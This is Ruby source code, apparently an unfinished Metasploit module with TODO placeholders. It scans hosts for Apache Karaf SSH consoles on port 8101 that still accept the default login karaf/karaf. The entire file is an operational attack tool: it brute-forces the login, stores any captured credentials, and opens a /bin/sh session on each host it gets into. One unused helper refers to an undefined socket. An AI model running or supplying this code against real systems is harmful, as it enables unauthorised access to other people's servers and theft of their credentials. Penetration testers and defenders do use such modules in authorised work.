##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Karaf Default Credential Scanner',
      'Description' => %q{
        TODO
      },
      'Author'      => ['TODO'],
      # 'References'     =>
      #   [
      #     [ 'CVE', '1999-0502'] # Weak password
      #   ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        # TODO Set default user, pass
        Opt::RPORT(8101),
        OptString.new('USERNAME', [true, 'Username', 'karaf']),
        OptString.new('PASSWORD', [true, 'Password', 'karaf'])
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('STOP_ON_SUCCESS', [ false, '', true]),
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

  end

  def rport
    datastore['RPORT']
  end

  def session_setup(result, ssh_socket)
    return unless ssh_socket

    # Create a new session
    conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)

    merge_me = {
      'USERNAME'      => result.credential.public,
      'PASSWORD'      => result.credential.private
    }
    info = "#{proto_from_fullname} #{result.credential} (#{@ip}:#{datastore['RPORT']})"
    s = start_session(self, info, merge_me, false, conn.lsock)

    # Set the session platform
    case result.proof
      when /Linux/
        s.platform = "linux"
      when /Darwin/
        s.platform = "osx"
      when /SunOS/
        s.platform = "solaris"
      when /BSD/
        s.platform = "bsd"
      when /HP-UX/
        s.platform = "hpux"
      when /AIX/
        s.platform = "aix"
      when /Win32|Windows/
        s.platform = "windows"
      when /Unknown command or computer name/
        s.platform = "cisco-ios"
    end

    s
  end

  def gather_proof
    proof = ''
    begin
      Timeout.timeout(5) do
        proof = ssh_socket.exec!("shell:info\n").to_s
      end
    rescue ::Exception
    end
    proof
  end

  def run_host(ip)
    @ip = ip
    print_status("Attempting login to #{ip}:#{rport}...")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      password: datastore['PASSWORD'],
      username: datastore['USERNAME']
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      proxies: datastore['Proxies'],
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: datastore['SSH_TIMEOUT'],
      framework: framework,
      framework_module: self,
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}')"
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          session_setup(result, scanner.ssh_socket)
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
          end
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
          invalidate_login(credential_data)
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          end
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        else
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end
end
